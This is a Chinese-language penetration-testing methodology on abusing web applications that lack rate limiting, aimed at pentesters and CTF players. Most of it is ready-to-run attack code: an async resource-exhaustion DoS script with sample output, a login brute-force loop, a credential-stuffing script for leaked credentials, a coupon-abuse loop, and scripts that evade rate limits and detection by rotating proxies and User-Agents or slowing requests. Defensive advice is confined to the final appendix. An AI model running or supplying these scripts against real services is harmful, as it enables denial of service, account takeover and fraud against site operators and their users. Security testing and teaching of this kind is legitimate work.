# 无速率限制滥用攻击方法论

## 1. 文档概述

### 1.1 编写目的
本方法论旨在为渗透测试人员提供针对**无速率限制机制的 Web 应用**进行资源滥用攻击的标准化流程。重点讲解如何识别无速率限制端点，并利用高资源消耗操作发起拒绝服务（DoS）攻击或自动化暴力测试。

### 1.2 适用范围
- 适用于登录接口、注册接口、密码重置接口等认证端点
- 适用于触发高资源消耗操作的端点（如文件上传、图像处理、PDF 生成）
- 适用于无 CAPTCHA、无 IP 封禁机制的 Web 应用
- 适用于 Flask、Django、FastAPI 等 Python Web 框架应用

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行安全评估的分析师
- CTF 参赛选手
- 应用安全研究人员

---

## 2. 技术专题：无速率限制滥用攻击

### 2.1 技术介绍

**漏洞原理：**
当 Web 应用未实施速率限制机制时，攻击者可以：
1. 发送无限数量的请求而不被阻止
2. 自动化执行暴力破解、凭证填充等攻击
3. 消耗服务器资源导致拒绝服务（DoS）
4. 绕过业务逻辑限制（如投票次数、优惠券领取）

**本质：**
- **资源层面**：每个请求消耗服务器资源（CPU、内存、I/O）
- **架构层面**：缺乏请求频率控制和异常检测机制
- **业务层面**：无 CAPTCHA、无账户锁定、无 IP 封禁等防护措施

**技术特征：**
```python
# Flask 应用无速率限制特征
- 无 Flask-Limiter 或类似库
- 无 @limiter.limit 装饰器
- 无请求计数或 IP 追踪逻辑
- 无 HTTP 429 响应
- 无 Retry-After 响应头
```

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 登录接口 | POST /login | 无速率限制可暴力破解密码，无账户锁定机制 |
| 注册接口 | POST /register | 可批量注册垃圾账户，消耗数据库资源 |
| 密码重置 | POST /forgot-password | 可触发大量密码重置邮件，邮件轰炸攻击 |
| 文件上传 | POST /upload | 每请求触发图像处理/PDF 生成，高 CPU 消耗 |
| 搜索功能 | GET /search | 复杂数据库查询，可消耗数据库资源 |
| 报告生成 | POST /generate-report | 每请求生成 PDF/Excel，高资源消耗 |
| 验证码发送 | POST /send-sms | 可发送大量 SMS，造成经济损失 |
| API 端点 | GET/POST /api/* | 无速率限制的 API 可被滥用 |

### 2.3 漏洞探测方法

#### 2.3.1 速率限制存在性检测

**步骤 1：基础请求测试**
```bash
# 发送单个请求检查响应头
curl -I http://target:5000/page

# 检查是否存在速率限制头
# 期望看到（如果有限制）：
# X-RateLimit-Limit: 100
# X-RateLimit-Remaining: 99
# Retry-After: 60
```

**步骤 2：连续请求测试**
```bash
# 发送 10 个连续请求
for i in {1..10}; do
  curl -s -w "Request $i: %{http_code}\n" -o /dev/null http://target:5000/page
done

# 观察响应码变化
# 如果全部返回 200，可能无速率限制
# 如果出现 429 Too Many Requests，存在速率限制
```

**步骤 3：并发请求测试**
```bash
# 使用 ab 或 wrk 进行并发测试
ab -n 100 -c 10 http://target:5000/page

# 或使用 curl 并发
for i in {1..50}; do
  curl -s http://target:5000/page &
done
wait
```

#### 2.3.2 高资源消耗操作识别

**代码审计方法：**
```python
# 搜索高资源消耗函数
grep -rn "subprocess\|Popen\|phantomjs\|selenium" /src/
grep -rn "Image\|PIL\|pillow\|opencv" /src/
grep -rn "PDF\|reportlab\|fpdf" /src/
grep -rn "Excel\|openpyxl\|pandas" /src/
grep -rn "sleep\|time\.delay" /src/
```

**响应时间分析：**
```bash
# 测量请求响应时间
time curl http://target:5000/page

# 如果响应时间 > 1 秒，可能存在高资源消耗操作
# PhantomJS 通常需要 2-3 秒
# 图像处理通常需要 0.5-2 秒
# PDF 生成通常需要 1-5 秒
```

#### 2.3.3 防护机制检测

**CAPTCHA 检测：**
```bash
# 检查登录/注册页面是否包含 CAPTCHA
curl http://target:5000/login | grep -i "captcha\|recaptcha\|hcaptcha"

# 检查是否有验证码图片
curl http://target:5000/login | grep -i "img.*captcha"
```

**账户锁定检测：**
```bash
# 尝试多次失败登录
for i in {1..10}; do
  curl -X POST http://target:5000/login \
    -d "username=admin&password=wrong$i" \
    -c cookies.txt
done

# 检查是否出现账户锁定消息
```

### 2.4 漏洞利用方法

#### 2.4.1 资源耗尽 DoS 攻击

**场景 1：PhantomJS 进程耗尽攻击**

```python
#!/usr/bin/env python3
"""
资源耗尽 DoS 攻击脚本
目标：无速率限制的 Flask 应用，每请求触发 PhantomJS 执行
"""

import asyncio
import aiohttp
import time
import statistics

class DoSExploitResult:
    def __init__(self):
        self.results = []
        self.start_time = 0
        self.end_time = 0

    def add_result(self, status, response_time, request_id):
        self.results.append({
            'id': request_id,
            'status': status,
            'response_time': response_time
        })

    def print_summary(self):
        total_requests = len(self.results)
        successful_requests = sum(1 for r in self.results if r['status'] == 200)
        success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0

        response_times = [r['response_time'] for r in self.results]
        avg_response_time = statistics.mean(response_times) if response_times else 0

        total_execution_time = self.end_time - self.start_time

        print("\n" + "="*70)
        print("RESOURCE EXHAUSTION DoS VULNERABILITY DEMONSTRATION")
        print("="*70)
        print(f"\n[+] Target Endpoint: http://localhost:38583/page")
        print(f"[+] Attack Vector: Concurrent resource-intensive requests")
        print(f"\n--- REQUEST STATISTICS ---")
        print(f"Total Requests Sent: {total_requests}")
        print(f"Successful Requests: {successful_requests}")
        print(f"Success Rate: {success_rate:.2f}%")
        print(f"\n--- RESPONSE TIME ANALYSIS ---")
        print(f"Average Response Time: {avg_response_time:.2f} seconds")
        print(f"Total Execution Time: {total_execution_time:.2f} seconds")

        if success_rate == 100:
            print(f"\n[!] CRITICAL: 100% success rate indicates NO RATE LIMITING")
            print(f"    All {total_requests} concurrent requests were accepted")

        if avg_response_time >= 2.0:
            print(f"\n[!] CRITICAL: Average response time ({avg_response_time:.2f}s) indicates")
            print(f"    each request spawns resource-intensive processes")

async def send_request(session, request_id, result):
    """发送单个请求并记录结果"""
    url = f"http://localhost:38583/page?name=dosattack{request_id}"

    try:
        start_time = time.time()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as response:
            await response.text()
            end_time = time.time()
            response_time = end_time - start_time
            result.add_result(response.status, response_time, request_id)
            print(f"[{request_id:2d}] Status: {response.status} | Time: {response_time:.2f}s")

    except asyncio.TimeoutError:
        end_time = time.time()
        response_time = end_time - start_time
        result.add_result(408, response_time, request_id)
        print(f"[{request_id:2d}] Status: TIMEOUT | Time: {response_time:.2f}s")

    except Exception as e:
        end_time = time.time()
        response_time = end_time - start_time
        result.add_result(500, response_time, request_id)
        print(f"[{request_id:2d}] Status: ERROR | Time: {response_time:.2f}s")

async def main():
    num_requests = 50  # 并发请求数量
    result = DoSExploitResult()

    print(f"\n[*] Initiating DoS attack with {num_requests} concurrent requests...")
    print(f"[*] Target: http://localhost:38583/page")

    result.start_time = time.time()

    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_request(session, i, result) for i in range(1, num_requests + 1)]
        await asyncio.gather(*tasks)

    result.end_time = time.time()
    result.print_summary()

if __name__ == "__main__":
    asyncio.run(main())
```

**使用方法：**
```bash
# 安装依赖
pip3 install aiohttp

# 执行攻击
python3 dos_exploit.py
```

**预期结果：**
```
======================================================================
RESOURCE EXHAUSTION DoS VULNERABILITY DEMONSTRATION
======================================================================

[+] Target Endpoint: http://localhost:38583/page
[+] Attack Vector: Concurrent resource-intensive requests

--- REQUEST STATISTICS ---
Total Requests Sent: 50
Successful Requests: 50
Success Rate: 100.00%

--- RESPONSE TIME ANALYSIS ---
Average Response Time: 2.72 seconds
Total Execution Time: 4.86 seconds

--- VULNERABILITY INDICATORS ---
[!] CRITICAL: 100% success rate indicates NO RATE LIMITING
    All 50 concurrent requests were accepted without throttling

[!] CRITICAL: Average response time (2.72s) indicates
    each request spawns a resource-intensive PhantomJS process
    Total server resources consumed: ~50 PhantomJS instances

--- ATTACK SCALABILITY ---
[!] Concurrent process spawn rate: 10.29 processes/second
[!] Without rate limiting, an attacker could easily:
    - Spawn hundreds of PhantomJS processes simultaneously
    - Exhaust server memory (~50-100 MB per PhantomJS instance)
    - Cause denial of service for legitimate users
```

#### 2.4.2 暴力破解攻击

**场景 2：登录接口暴力破解**

```bash
#!/bin/bash
# 登录暴力破解脚本

TARGET="http://localhost:5000/login"
USERNAME="admin"

# 使用常见密码字典
while IFS= read -r password; do
  RESPONSE=$(curl -s -X POST "$TARGET" \
    -d "username=$USERNAME&password=$password" \
    -c cookies.txt)

  if echo "$RESPONSE" | grep -q "Welcome\|Dashboard\|Success"; then
    echo "[+] Password found: $password"
    break
  fi

  echo "[-] Trying: $password"
done < passwords.txt
```

#### 2.4.3 凭证填充攻击

**场景 3：使用泄露凭证进行填充**

```python
#!/usr/bin/env python3
"""
凭证填充攻击脚本
使用泄露的用户名/密码组合尝试登录
"""

import requests

def credential_stuffing(target_url, credentials_file):
    """执行凭证填充攻击"""

    with open(credentials_file, 'r') as f:
        credentials = [line.strip().split(':') for line in f.readlines()]

    success_count = 0

    for username, password in credentials:
        try:
            response = requests.post(target_url, data={
                'username': username,
                'password': password
            })

            if 'Welcome' in response.text or 'Dashboard' in response.text:
                print(f"[+] SUCCESS: {username}:{password}")
                success_count += 1
            else:
                print(f"[-] FAILED: {username}:{password}")

        except Exception as e:
            print(f"[!] ERROR: {e}")

    print(f"\n[+] Total successful logins: {success_count}")

if __name__ == "__main__":
    credential_stuffing(
        "http://localhost:5000/login",
        "leaked_credentials.txt"
    )
```

#### 2.4.4 业务逻辑滥用

**场景 4：优惠券/积分滥用**

```bash
#!/bin/bash
# 优惠券批量领取攻击

TARGET="http://localhost:5000/api/claim-coupon"
USER_ID="victim_user"

# 快速连续领取 100 次
for i in {1..100}; do
  curl -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"user_id\":\"$USER_ID\",\"coupon_id\":\"NEWUSER50\"}" \
    -c cookies.txt &

  # 每 10 个请求稍微延迟，避免网络拥塞
  if [ $((i % 10)) -eq 0 ]; then
    sleep 0.1
  fi
done

wait
echo "Attack completed - check victim account for coupon count"
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过简单 IP 速率限制

**使用代理池：**
```python
#!/usr/bin/env python3
"""
使用代理池绕过 IP 速率限制
"""

import requests
from itertools import cycle

def get_proxy_list():
    """获取代理列表"""
    # 从代理服务获取或使用本地代理列表
    proxies = [
        'http://proxy1:8080',
        'http://proxy2:8080',
        'http://proxy3:8080',
    ]
    return cycle(proxies)

def rotate_ip_attack(target_url, proxy_pool, num_requests=100):
    """使用轮换 IP 进行攻击"""

    for i in range(num_requests):
        proxy = next(proxy_pool)
        proxies = {'http': proxy, 'https': proxy}

        try:
            response = requests.get(target_url, proxies=proxies, timeout=10)
            print(f"[{i+1}] Proxy: {proxy} - Status: {response.status_code}")
        except Exception as e:
            print(f"[{i+1}] Proxy: {proxy} - Error: {e}")

if __name__ == "__main__":
    proxy_pool = get_proxy_list()
    rotate_ip_attack("http://target:5000/page", proxy_pool)
```

**使用 IPv6 地址：**
```bash
# 如果服务器对 IPv6 单独计数
for i in {1..100}; do
  curl -6 --interface "eth0:$i" http://target:5000/page &
done
```

#### 2.5.2 绕过 User-Agent 检测

```python
#!/usr/bin/env python3
"""
轮换 User-Agent 绕过检测
"""

import requests
import random

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
]

def rotate_ua_attack(target_url, num_requests=100):
    """使用轮换 UA 进行攻击"""

    for i in range(num_requests):
        headers = {'User-Agent': random.choice(USER_AGENTS)}

        try:
            response = requests.get(target_url, headers=headers)
            print(f"[{i+1}] UA: {headers['User-Agent'][:50]}... - Status: {response.status_code}")
        except Exception as e:
            print(f"[{i+1}] Error: {e}")

if __name__ == "__main__":
    rotate_ua_attack("http://target:5000/page")
```

#### 2.5.3 绕过请求频率检测

**慢速攻击（Low and Slow）：**
```python
#!/usr/bin/env python3
"""
慢速攻击 - 低于检测阈值的请求频率
"""

import requests
import time
import random

def slow_attack(target_url, interval_range=(2, 5), num_requests=100):
    """
    慢速攻击：每 2-5 秒发送一个请求
    绕过基于频率的检测
    """

    for i in range(num_requests):
        try:
            response = requests.get(target_url)
            print(f"[{i+1}] Status: {response.status_code}")

            # 随机间隔 2-5 秒
            sleep_time = random.uniform(*interval_range)
            time.sleep(sleep_time)

        except Exception as e:
            print(f"[{i+1}] Error: {e}")

if __name__ == "__main__":
    slow_attack("http://target:5000/page")
```

---

## 3. 附录

### 3.1 常用攻击工具速查表

| 工具名称 | 用途 | 使用示例 |
|---------|------|---------|
| ab (Apache Bench) | HTTP 压力测试 | `ab -n 1000 -c 100 http://target/page` |
| wrk | 高性能 HTTP 基准测试 | `wrk -t12 -c400 -d30s http://target/page` |
| siege | HTTP 负载测试 | `siege -c50 -r100 http://target/page` |
| hydra | 暴力破解工具 | `hydra -l admin -P passwords.txt http-post-form` |
| burp intruder | 暴力破解/Fuzzing | Burp Suite 内置模块 |
| aiohttp (Python) | 异步 HTTP 请求 | 自定义 DoS 脚本 |
| requests (Python) | HTTP 请求库 | 自定义攻击脚本 |

### 3.2 速率限制检测清单

| 检测项 | 检测方法 | 存在限制的标志 |
|-------|---------|---------------|
| 速率限制头 | 检查 X-RateLimit-* 头 | 存在 X-RateLimit-Limit |
| HTTP 429 响应 | 发送大量请求 | 返回 429 Too Many Requests |
| Retry-After 头 | 检查响应头 | 存在 Retry-After |
| 请求延迟 | 连续请求观察响应时间 | 响应时间逐渐增加 |
| IP 封禁 | 大量请求后检查 | 返回 403 或连接被拒绝 |
| CAPTCHA 触发 | 多次失败后检查 | 出现验证码要求 |
| 账户锁定 | 多次失败登录后检查 | 账户被锁定消息 |

### 3.3 高资源消耗操作识别清单

| 操作类型 | 识别方法 | 资源消耗 |
|---------|---------|---------|
| PhantomJS/无头浏览器 | subprocess.Popen + phantomjs | ~50-100MB 内存/请求 |
| Selenium WebDriver | selenium.webdriver | ~100-200MB 内存/请求 |
| 图像处理 | PIL/Pillow/OpenCV | ~10-50MB 内存/请求 |
| PDF 生成 | reportlab/fpdf | ~5-20MB 内存/请求 |
| Excel 生成 | openpyxl/pandas | ~10-50MB 内存/请求 |
| 视频处理 | ffmpeg/opencv | ~100-500MB 内存/请求 |
| 复杂数据库查询 | 多表 JOIN/子查询 | 高 CPU/IO 消耗 |
| 文件压缩/解压 | zipfile/tarfile | 高 CPU/IO 消耗 |

### 3.4 防御建议

**实施速率限制：**
```python
# Flask-Limiter 示例
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/page")
@limiter.limit("10 per minute")
def page():
    return render_template('page.html')

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    # 登录逻辑
    pass
```

**添加 CAPTCHA：**
```python
# reCAPTCHA 验证
import requests

def verify_recaptcha(token, secret_key):
    response = requests.post(
        'https://www.google.com/recaptcha/api/siteverify',
        data={'secret': secret_key, 'response': token}
    )
    return response.json()['success']
```

**实施账户锁定：**
```python
from flask_login import LoginManager
from datetime import datetime, timedelta

login_attempts = {}

def check_account_lock(username):
    """检查账户是否被锁定"""
    if username in login_attempts:
        attempts, lock_time = login_attempts[username]
        if attempts >= 5:
            if datetime.now() - lock_time < timedelta(minutes=15):
                return True  # 账户锁定中
            else:
                # 重置计数
                login_attempts[username] = (0, datetime.now())
    return False

def record_login_attempt(username, success):
    """记录登录尝试"""
    if success:
        login_attempts.pop(username, None)
    else:
        if username not in login_attempts:
            login_attempts[username] = (0, datetime.now())
        attempts, _ = login_attempts[username]
        login_attempts[username] = (attempts + 1, datetime.now())
```

**监控和告警：**
```python
# 简单异常检测
from collections import defaultdict
import time

request_counts = defaultdict(list)

def detect_abuse(ip_address, threshold=100, window=60):
    """检测异常请求频率"""
    current_time = time.time()
    request_counts[ip_address].append(current_time)

    # 清理旧记录
    request_counts[ip_address] = [
        t for t in request_counts[ip_address]
        if current_time - t < window
    ]

    # 检查是否超过阈值
    if len(request_counts[ip_address]) > threshold:
        return True  # 检测到滥用

    return False
```

---

**文档版本：** 1.0
**最后更新：** 2026 年 3 月
**适用场景：** 渗透测试、安全评估、CTF 挑战
